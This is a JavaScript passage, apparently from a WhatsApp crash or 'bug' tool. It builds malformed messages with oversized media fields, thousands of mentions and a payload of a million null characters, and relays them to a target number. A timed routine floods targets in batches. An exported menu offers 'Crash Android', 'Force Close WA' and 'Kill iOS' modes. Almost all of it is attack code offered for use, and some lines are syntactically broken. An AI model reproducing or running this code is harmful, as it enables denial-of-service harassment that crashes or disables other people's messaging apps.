  for (let z = 0; z = 1000; z++) {
    const header = {
      title: '7eppeli.pdf,
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/12149372_10035125079888877_2626754303498270911_n.enc?ccb=11-4&oh=01_Q5Aa1wFIr19qtg1EEatsDh09AHko83pYR8bYGzU7Wc9zCWh48Q&oe=68726852&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "d0JIqFXbkYr7Q0BsVZB8ofnTO0JZYauyDGLNopgLfNo=",
        fileLength: 2502200825022008,
        seconds: 77777777,
        mediaKey: "wuED6VegoqlOHx9IZYQjMj3ySrhgtpJs/NlzrlXgCck=",
        height: 1088,
        width: 736,
        fileEncSha256: "KGszaobqQ8QKFOp1UrgqvRp54SEhCNfyp8/dfLqbFVs=",
        directPath: "/v/t62.7161-24/12149372_10035125079888877_2626754303498270911_n.enc?ccb=11-4&oh=01_Q5Aa1wFIr19qtg1EEatsDh09AHko83pYR8bYGzU7Wc9zCWh48Q&oe=68726852&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1749737059",
        contextInfo: {},
        streamingSidecar: "xey0UW72AH+ShCjYXVzOom/k+kt7VJryEZ+yNyAarqVJHx8L4j6sB4Da5ZGHXTfzX9g=",
        thumbnailDirectPath: "/v/t62.36147-24/19977827_1442378506945978_3754389976888828856_n.enc?ccb=11-4&oh=01_Q5Aa1wGz9o9ukGbtWxoetr_ygoJDy0SN80KaAwJ1vywXvbTH8A&oe=687247F9&_nc_sid=5e03e0",
        thumbnailSha256: "hxKrzb6DDC8qTu2xOdeZN4FBgHu8cmNekZ+pPye6dO0=",
        thumbnailEncSha256: "Es1ZWpjDKRZ82XpiLARj3FZWh9DeFCEUG2wU8WHWrRs=",
        annotations: [
          {
            embeddedContent: {
              embeddedMusic: {
                musicContentMediaId: "1942620729844671",
                songId: "432395962368430",
                author: "sock Da",
                title: "Уччкеу Дїшауи Жіьпарріп",
                artworkDirectPath: "/v/t62.76458-24/11810390_1884385592310849_8570381233425191298_n.enc?ccb=11-4&oh=01_Q5Aa1wFo3eosJQYj_I0wJby373H-MKodRwdx1sCOEt426yyLCg&oe=687233BB&_nc_sid=5e03e0",
                artworkSha256: "8x8ENCxJyIrSFnF9ZHtiim423uGgPleSm8zPEbQZByE=",
                artworkEncSha256: "HlsJKALVejvghjYZIrY46zosCX568b1cG9SzzZfCPNA=",
                artistAttribution: "",
                countryBlocklist: "",
                isExplicit: false,
                artworkMediaKey: "0DsOnYZAyNwPJgs5PZwL/EtFxBXO2cW9zwLYZGcAkvU="
              }
            },
            embeddedAction: true
          }
        ]
      }, 
      hasMediaAttachment: true, 
    };
    cards.push({
      header, 
      nativeFlowMessage: {
        buttons: [{
          name: ""
        }], 
        messageVersion: 3
      }
    })
  }
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: "7eppeli.pdf"
          },
          carouselMessage: {
            cards
          },
          contextInfo: {
            mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z+1}@s.whatsapp.net`),
            participant: "0@s.whatsapp.net",
            isGroupMention: true,            
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(1000000)}\"}`, 
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "status@broadcast"
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}




// INI BUAT BUTTON DELAY 50%
async function delaylow(sock, durationHours, X) {
    if (!sock) {
        console.error('❌ Socket tidak tersedia untuk delaylow');
        return;
    }

    const totalDurationMs = durationHours * 3600000;
    const startTime = Date.now();
    let count = 0;
    let batch = 1;
    const maxBatches = 5;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
            return;
        }

        try {
            if (count < 30) {
                await Promise.all([
                    N3xithBlank(sock, X),
                    despiczy(sock, X),
                    despiczy(sock, X),
                    despiczy(sock, X),
                    despiczy(sock, X),
                    sleep(500)
                ]);

                console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/30 delaylow 📟
└────────────────────────┘
  `));
                count++;
                setTimeout(sendNext, 700);
            } else {
                console.log(chalk.green(`👀 Success Send Bugs to ${X} (Batch ${batch})`));
                if (batch < maxBatches) {
                    console.log(chalk.yellow(`( 🍷 Indictive | Core V6 ).`));
                    count = 0;
                    batch++;
                    setTimeout(sendNext, 300000);
                } else {
                    console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
                }
            }
        } catch (error) {
            console.error(`✗ Error saat mengirim: ${error.message}`);
            setTimeout(sendNext, 700);
        }
    };
    sendNext();
}

// ==================== EXPORTED ACTIONS ==================== //

// Tentukan tindakan di sini. Anda dapat mengganti nama kunci (misalnya 'crashAndroid') sesuai keinginan Anda.
// Namun, pastikan formulir HTML Anda mengirimkan 'mode' yang sesuai.

const actions = {
    crashAndroid: {
        name: "Crash Android System",
        description: "Crash target Android WA",
        icon: "fa-brands fa-android",
        execute: async (sock, target) => {
            for (let i = 0; i < 1; i++) {
                await PaymentNoButton(sock, target);
         await FcPay1hit(target);
         await occolotopysV2(sock, target);
         await blankxzvr(sock, target);
         await Xwrghkaz(sock, target);
         await XvZDonger(sock, target);
            }
            console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
        }
    },
    invisDelay: {
        name: "Invisible Delay",
        description: "Causes invisible delay",
        icon: "fa-solid fa-clock",
        execute: async (sock, target) => {
            await CardsResp(target);
        }
    },
    forceClose: {
        name: "Force Close WA",
        description: "Force close the app",
        icon: "fa-solid fa-skull",
        execute: async (sock, target) => {
            for (let i = 0; i < 1; i++) {
                await PaymentNoButton(sock, target);
         await FcPay1hit(target);
         await occolotopysV2(sock, target);
         await FcPay1hit(target);
         await occolotopysV2(sock, target);
            }
            console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
        }
    },
    killIos: {
        name: "Kill IOS",
        description: "Crash iOS WA",
        icon: "fa-brands fa-apple",
        execute: async (sock, target) => {
            for (let i = 0; i < 1; i++) {
                await PaymentNoButton(sock, target);
         await TrueIos(target);
         await TrueIos(target);
         await TrueIos(target);
            }
            console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
        }
    }
};

module.exports = {
    actions
};
